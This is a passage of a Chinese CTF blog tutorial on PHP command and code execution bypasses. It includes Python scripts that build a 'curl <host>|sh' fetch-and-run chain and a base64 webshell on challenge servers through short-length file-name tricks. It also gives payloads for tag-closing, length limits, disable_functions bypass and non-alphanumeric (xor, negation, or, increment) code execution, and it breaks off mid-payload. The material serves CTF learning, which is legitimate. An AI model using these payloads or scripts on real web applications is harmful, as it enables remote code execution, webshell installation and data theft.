<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:58</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://5d1769eb-d4a2-4077-bed9-7eb90cbdf2f9.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-comment">#curl 335708495|sh</span><br><span class="hljs-string">&#x27;&gt;sh&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;5\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;49\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;08\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;57\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;33\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rl\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cu\\&#x27;</span>,<br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span>,<br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>

<h5 id="环境无dir，可写但不出网"><a href="#环境无dir，可写但不出网" class="headerlink" title="环境无dir，可写但不出网"></a>环境无dir，可写但不出网</h5><p>因为<code>ls -t</code>命令对文件进行排序时只能有一个空格，一个重定向符号，一个管道符，多了排序就乱了，所以不能直接用<code>echo xxx|base64 -d&gt;a.php</code>的方式了，且考虑到万一临时文件过多的情况，也不采用5字符的上传临时文件的方法。解决方案是用<code>$&#123;IFS&#125;</code>代替空格，变成<code>echo$&#123;IFS&#125;xxxxxx|base64 -d&gt;a.php</code></p>
<p>步骤与<code>4字符-环境无dir，可写</code>基本一致，只是替换了<code>curl命令</code>，变成了<code>echo ...</code></p>
<p>自动化脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:56:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://499e4b26-b5cd-43a8-b0d1-6a8ec2451dea.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>

<h3 id="长度限制总结"><a href="#长度限制总结" class="headerlink" title="长度限制总结"></a>长度限制总结</h3><p>1：当有长度限制的情况下，最少可以在<code>4</code>字符<code>无dir</code>环境下拼接出<code>ls -t</code><br>2：空格不够用时可以用<code>$&#123;IFS&#125;</code>代替，只要命令部分不出现重复的字符组合就行</p>
<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><p><code>eval()</code>，<code>assert()</code>，<code>preg_replace()</code>，<code>create_function()</code>，<code>array_map()</code>，<code>call_user_func()</code>，<code>call_user_func_array()</code>，<code>array_filter()</code>，<code>uasort()</code>，<code>array_walk_recursive</code>等</p>
<h2 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h2><p>某些题目表面上没有禁用函数，实际上在<code>php.ini</code>中使用了<code>disable_functions</code>来禁用函数</p>
<p>可以通过蚁剑的插件或手工绕过</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/disable_functions.png"></p>
<p>小trick：<code>get形式的代码执行可以用转接头的形式在蚁剑上连接，例如/?1=assert($_POST[2]);</code></p>
<h2 id="标签闭合绕过"><a href="#标签闭合绕过" class="headerlink" title="标签闭合绕过"></a>标签闭合绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|\;/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>闭合了标签，那就造一个新的标签<code>&lt;script language=&quot;php&quot;&gt;system(&#39;tac /f*&#39;)&lt;/script&gt;</code></p>
<p>小trick：<code>&lt;/script&gt;结束标签自带一个;</code></p>
<h2 id="标签闭合-长度限制"><a href="#标签闭合-长度限制" class="headerlink" title="标签闭合+长度限制"></a>标签闭合+长度限制</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&lt;=<span class="hljs-number">13</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>构造一个小于13位的参数：<code>&lt;?`$_GET[2]`;</code></p>
<p>然后可以利用<code>&amp;2</code>传入反弹shell的命令等操作</p>
<h2 id="无字母数字代码执行"><a href="#无字母数字代码执行" class="headerlink" title="无字母数字代码执行"></a>无字母数字代码执行</h2><p>也是很经典的一类题目，参数中不能出现字母和数字<br>思路就是通过非字母数字的字符经过各种变换构造出任意字母，然后拼接出函数执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure>

<h3 id="异或xor"><a href="#异或xor" class="headerlink" title="异或xor"></a>异或xor</h3><p>在php中，两个字符进行异或操作后，得到的依然是一个字符，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是相同为零，不同为一</p>
<p>例如<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)</code>，异或后得到<code>system</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/xor.png"></p>
<p>yu师傅的脚本，用来生成一个字典</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure>

<p>然后用<code>($a)();</code>的形式执行代码即可，但是要注意<code>PHP7</code>前是不允许用<code>($a)();</code>这样的方法来执行动态函数的</p>
<p>补充：<code>PHP&gt;8</code>就不支持将没有引号包裹的字符解析为对应字符串了，<code>xx^yy</code>-&gt;<code>&#39;xx&#39;^&#39;yy&#39;</code>，这里<code>x  y</code>代表<code>ascii</code>大于<code>128</code>的值</p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>例子</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">8C</span></span>-10001100<br>逐位取反<br><span class="hljs-tag">%<span class="hljs-selector-tag">73</span></span>-01110011<br></code></pre></td></tr></table></figure>

<p>利用php的取反符号<code>~</code>来构造任意字母</p>
<p>yu师傅脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h3 id="或or"><a href="#或or" class="headerlink" title="或or"></a>或or</h3><p>原理与异或一致，利用符号<code>|</code>来构造</p>
<p>或运算就是有一为一，都是零就是零，比如说<code>3|10</code>，就是<code>0011|1010</code>，结果为<code>1011</code></p>
<p>脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure>


<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>利用PHP中的<a href="https://www.php.net/manual/zh/language.operators.increment.php">递增&#x2F;递减运算符</a>，也就是说<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code></p>
<p>然后利用php强制输出数组时，数组会被转换成字符串<code>Array</code>，拿到<code>A</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/zizeng.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//测试发现7.0.12以上版本不可使用</span><br><span class="hljs-comment">//使用时需要url编码下</span><br><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span 